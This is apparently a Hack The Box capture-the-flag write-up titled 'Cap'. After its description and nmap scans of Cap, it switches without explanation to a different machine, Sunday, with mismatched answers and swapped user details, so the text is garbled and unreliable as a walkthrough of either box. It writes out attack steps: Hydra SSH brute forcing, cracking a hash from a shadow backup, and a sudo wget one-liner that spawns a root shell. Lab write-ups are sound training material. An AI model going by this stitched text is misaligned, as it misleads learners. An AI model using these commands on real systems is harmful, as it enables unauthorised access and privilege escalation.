---
description: https://www.hackthebox.com/machines/cap
---

# Cap

<div align="left"><figure><img src="../.gitbook/assets/image (375).png" alt="" width="150"><figcaption><p>@hackthebox.com</p></figcaption></figure></div>

🔗 [Cap](https://www.hackthebox.com/machines/cap)

<details>

<summary>About</summary>

### Machine Description

Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

### Area of Interest

Vulnerability Assessment | Common Security Controls | Security Operations | Log Analysis

### Vulnerabilities

Clear Text Credentials | File System Configuration | Insecure Direct Object Reference (IDOR)

### Security Tools

Nmap | LinPEAS | Wireshark

### Languages

Python

### Techniques

Packet Capture Analysis | Password Reuse | SUID Exploitation

</details>

## Task 0 - Deploy machine

🎯 Target IP: `10.129.237.24`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.

## Task 1 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "10.129.237.24 cap.htb" >> /etc/hosts
</strong>
mkdir -p htb/cap.htb
cd htb/cap.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 cap.htb
PING cap.htb (10.129.237.24) 56(84) bytes of data.
64 bytes from cap.htb (10.129.237.24): icmp_seq=6 ttl=63 time=77.8 ms
64 bytes from cap.htb (10.129.237.24): icmp_seq=9 ttl=63 time=80.1 ms
64 bytes from cap.htb (10.129.237.24): icmp_seq=11 ttl=63 time=51.5 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target should be a **\*nix** system, while Windows systems usually have a TTL of 128 secs.

### 1.1 - How many TCP ports are open?

Let's start right away with an active port scan with nmap

```bash
sudo nmap -p0- -sS -Pn -T4 -vvv cap.htb -oN nmap/tcp_port_scan
```

```bash
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 3 open TCP ports on the machine: 21, 22, 80.

Then, we can proceed to analyze services active on open ports:

```bash
sudo nmap -sV -sC -p 21,22,80 cap.htb -oN nmap/service_port_scan
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:26 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:21 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:21 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=1/2%Time=67767B84%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1FBC,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Thu,\x2002\x20Jan\x202025\x2011:42:21\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:9386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\"
SF:>\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\
SF:x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x2
SF:0\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<met
SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
SF:e=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"ima
SF:ge/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\
SF:">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/f
SF:ont-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20re
SF:l=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min
SF:\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static
SF:/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpti
SF:ons,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,\
SF:x2002\x20Jan\x202025\x2011:42:21\x20GMT\r\nConnection:\x20close\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\
SF:x20HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20te
SF:xt/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x
SF:20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body
SF:>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inva
SF:lid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RT
SF:SP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,1
SF:89,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x2
SF:0Thu,\x2002\x20Jan\x202025\x2011:42:26\x20GMT\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2023
SF:2\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x
SF:20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h
SF:1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20s
SF:erver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20
SF:check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Good, to understand the target scope, we can start to checking web server via broswer:



















Login bypass unfortunaly doesn't work and we don't obtained great info via whatweb.

```bash
whatweb sunday.htb:6787
http://sunday.htb:6787 [400 Bad Request] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.129.237.18], Title[400 Bad Request], X-Frame-Options[SAMEORIGIN]
```







{% hint style="info" %}
3
{% endhint %}

### 1.2 - After running a "Security Snapshot", the browser is redirected to a path of the format /\[something]/\[id], where \[id] represents the id number of the scan. What is the \[something]?

### How finger service works?

The **Finger** program/service is utilized for retrieving details about computer users. Typically, the information provided includes the **user's login name, full name**, and, in some cases, additional details. These extra details could encompass the office location and phone number (if available), the time the user logged in, the period of inactivity (idle time), the last instance mail was read by the user, and the contents of the user's plan and project files.

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger" %}

The best way to learn one thing is to improve yourself and develop your own tools, so I did and created the following tool in python that allows us to enumerate the users of the system using a dictionary attack with a common wordlist.

{% embed url="https://github.com/dev-angelist/Finger-User-Enumeration" %}

```bash
```

excluding the root user, there are two users listed: sammy and sunny.

{% hint style="info" %}
2
{% endhint %}

## Task 2 - Find User Flag

### 2.1 - What is the password for the sunny user on Sunday?

We can use brute force tool like as Hydra to try to found sunny's password. We can do a tentative via SSH/22022 protocol.

```
hydra -l sunny -P /home/kali/Downloads/probable-v2-top1575.txt -I -f ssh://sunday.htb:22022

```

<figure><img src="../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

Fantastic, here is our password, which honestly we could have even tried to guess.

{% hint style="info" %}
sunday
{% endhint %}

### 2.2 - What is the password for user `sammy` on the box?

\
Using again Hydra we don't obtain results, then we can try to login via ssh into sunny user. &#x20;

```bash
ssh sunny@sunday.htb -p 22022
```

Here we find the folders of the two users, but without any valuable information about the password.

In sammy's folder there is the bash history, so let's try to check if there were any passwords written incorrectly in clear text.

```bash
cat ~/.bash_history | grep "password"
```

No results.

Fortunately, investigating a bit, we find in the path /backup the file shadow.backup, containing the backup of the file /etc/shadow and therefore of the hashes of the users.&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure></div>

So we save the sammy's hash and launch john or hashcat to crack it.

```bash
echo "sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::" >> sammy_hash
```

```bash
john sammy_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>

Well done!

{% hint style="info" %}
cooldude!
{% endhint %}

### 2.3 -  Submit the flag located in the sammy user's home directory.

Now that we also know sammy's password, we can ssh in and get the flag easily.

```bash
ssh sammy@sunday.htb -p 22022
```

```bash
cat user.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

db7749ca1b003cf371c1f2afed38f834

</details>

## Task 3 - Find root flag

### 3.1 - What is the full path of the binary that user sunny can run with sudo privileges?

Executing `sudo -l` command we can commands that user puma can execute with sudo privileges:

<div align="left"><figure><img src="../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
/root/troll
{% endhint %}

### 3.2 - What is the complete path of the binary that user sammy can run with sudo privileges?

Same thing, `sudo -l` command and it's done!

<div align="left"><figure><img src="../.gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
/usr/bin/wget
{% endhint %}

### 3.3 - Submit the flag located in root's home directory.

The previous two tasks are the prelude to privilege escalation, let's checking them!

#### sammy

* /root/troll

Not knowing "troll" which I imagine is an ironic name, we focus on the usual wget.

#### sunny

* /usr/bin/wget

As always, the wget bible has a solution for privilege escalation with sudo.

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

{% embed url="https://gtfobins.github.io/gtfobins/wget/" %}

<div align="left"><figure><img src="../.gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure></div>

```
cat /root/root.txt
```

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

c4fc01d4944cf3925f079da70abdaea7

</details>

<figure><img src="../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>
